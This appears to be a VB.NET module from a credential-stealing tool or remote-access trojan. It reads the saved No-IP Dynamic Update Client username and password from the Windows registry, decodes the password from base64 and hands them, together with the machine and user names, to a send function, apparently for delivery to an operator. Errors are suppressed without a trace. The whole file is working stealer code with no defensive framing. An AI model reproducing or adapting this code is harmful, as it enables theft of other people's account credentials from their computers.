Option Strict Off
Imports Microsoft.VisualBasic
Module No_IP
    Public Function base64Decode(ByVal data As String)
        Try
            Dim encoder As New System.Text.UTF8Encoding()
            Dim utf8Decode As System.Text.Decoder = encoder.GetDecoder()
            Dim todecode_byte As Byte() = Convert.FromBase64String(data)
            Dim charCount As Integer = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length)
            Dim decoded_char As Char() = New Char(charCount - 1) {}
            utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0)
            Dim result As String = New [String](decoded_char)
            Return result
        Catch e As Exception
            Return "Error"
        End Try
    End Function
    Sub IpRecord()
        Try
            Dim Username As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC", "Username", Nothing)
            Dim Password As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC", "Password", Nothing)

            If Not Username = Nothing Then

                SendMiscCommandRecover(Environment.MachineName & "/" & Environment.UserName & "|" & "There is no host!" & "|" & Username & "|" & base64Decode(Password) & "|" & 0 & "|[NO-IP]")

            End If

        Catch
        End Try
    End Sub
End Module